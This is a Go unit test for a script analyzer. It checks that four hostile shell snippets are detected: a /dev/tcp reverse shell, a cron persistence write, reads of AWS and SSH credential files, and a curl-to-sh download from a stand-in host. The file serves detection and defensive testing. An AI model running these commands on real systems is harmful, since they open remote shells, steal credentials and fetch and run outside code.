package analyzer

import "testing"

func TestScriptPatternCorpus(t *testing.T) {
	cases := []struct {
		name       string
		body       string
		reasonCode string
	}{
		{
			name:       "reverse-shell",
			body:       "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
			reasonCode: "REVERSE_SHELL",
		},
		{
			name:       "persistence-write",
			body:       "echo '* * * * * /tmp/x.sh' >> /etc/cron.d/pwn",
			reasonCode: "PERSISTENCE_WRITE",
		},
		{
			name:       "credential-read",
			body:       "cat ~/.aws/credentials\ncat ~/.ssh/id_rsa",
			reasonCode: "CREDENTIAL_READ",
		},
		{
			name:       "staged-downloader",
			body:       "curl -fsSL https://evil.test/a.sh | sh",
			reasonCode: "STAGED_DOWNLOADER",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings := analyzeScriptBody("https://unit.test/install.sh", tc.body)
			found := false
			for _, f := range findings {
				if f.ReasonCode == tc.reasonCode {
					found = true
					break
				}
			}
			if !found {
				t.Fatalf("expected reason code %s, got %#v", tc.reasonCode, findings)
			}
		})
	}
}
